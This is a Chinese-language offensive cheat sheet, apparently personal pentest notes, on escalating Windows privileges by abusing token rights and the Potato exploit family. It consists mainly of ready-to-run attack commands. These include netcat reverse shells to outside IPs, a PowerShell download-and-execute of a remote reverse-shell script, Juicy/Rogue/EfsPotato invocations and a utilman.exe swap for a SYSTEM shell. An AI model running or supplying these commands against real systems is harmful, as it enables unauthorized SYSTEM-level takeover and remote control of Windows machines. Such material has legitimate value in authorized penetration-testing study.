# 利用Impersonation 权限提权

**SeAssignPrimaryToken 权限:**  使用 **土豆家族** 来进行提权

**SeBackup  权限**：读取敏感文件robocopy /b

**SeCreateToken 权限**：使用创建任意令牌，包括NtCreateToken

**SeDebug 权限** ：复制`lsass.exe`令牌  ，利用方式：**可在[FuzzySecurity找到的脚本](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)**

**SeLoadDriver 权限**：1.加载有缺陷的内核驱动程序，例如`szkg64.sys`或`capcom.sys`  2.利用驱动程序漏洞 （`szkg64`漏洞编号为[CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)）（`szkg64`[漏洞利用代码](https://www.greyhathacker.net/?p=1025)）

**SeRestore 权限**：利用powershell

1.启动具有 SeRestore 权限的 PowerShell/ISE 2.使用[Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)启用权限3.将 utilman.exe 重命名为 utilman.old 4.将 cmd.exe 重命名为 utilman.exe 5.锁定控制台并按 Win+U

**SeTakeOwnership 权限**：利用方式：1. takeown.exe /f "%windir%\system32” 2. icalcs.exe "%windir%\system32" /grant "%username%":F 3. 将 cmd.exe 重命名为 utilman.exe

4.锁定控制台并按 Win+U

**SeTcb 权限：未知**

## ****恢复服务帐户的权限-先决条件：权限为LOCAL SERVICE 或 NETWORK SERVICE****

https://github.com/itm4n/FullPowers 利用工具，下列为**利用方式**：

```bash
FullPowers    //加载程序
FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z 
```

**其他利用工具：**

```bash
Tokenvator.exe getsystem cmd.exe
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
psexec -s -i cmd.exe
python getsystem.py   # https://github.com/sailay1996/tokenx_privEsc
```

## ****RottenPotato (Token Impersonation先决条件)****

```bash
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

## ****Juicy Potato-具有SeImpersonate/SeAssignPrimaryToken 权限****

**如果机器>= Windows 10 1809 & Windows Server 2019 - 试试Rogue Potato**

**如果机器是< Windows 10 1809 < Windows Server 2019 - 试试Juicy Potato**

**EXP程序：[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)**

**CLSID：**

1.  [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
2.  [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
3.  [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
4.  [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
5.  [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
6.  [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
7.  [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)

**使用方式：**

```bash
cmd /c JuicyPotato64.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.3 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

```bash
JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

```bash
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

## ****Rogue Potato****

`socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999`

**如果有防护墙限制：**

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
```

**如果可以在本地9999端口运行：**

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
```

**特定管道和CLSID运行：**

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

## ****EFSPotato (MS-EFSR EfsRpcOpenFileRaw)****

https://github.com/zcgonvh/EfsPotato - **EXP为编译的源码**

```bash
csc EfsPotato.cs
csc /platform:x86 EfsPotato.cs 
```

### **土豆系列提权：**

[Juicypotato 提权 (1)](%E5%88%A9%E7%94%A8Impersonation%20%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83%20ec1a8b0450e2454299151d4377c87709/Juicypotato%20%E6%8F%90%E6%9D%83%20(1)%2005659100040a4af398c7c6398ca914ed.md)

[土豆系列提权解说 (1)](%E5%88%A9%E7%94%A8Impersonation%20%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83%20ec1a8b0450e2454299151d4377c87709/%E5%9C%9F%E8%B1%86%E7%B3%BB%E5%88%97%E6%8F%90%E6%9D%83%E8%A7%A3%E8%AF%B4%20(1)%20bff2e02e3e0041bd82e81e758fd31599.md)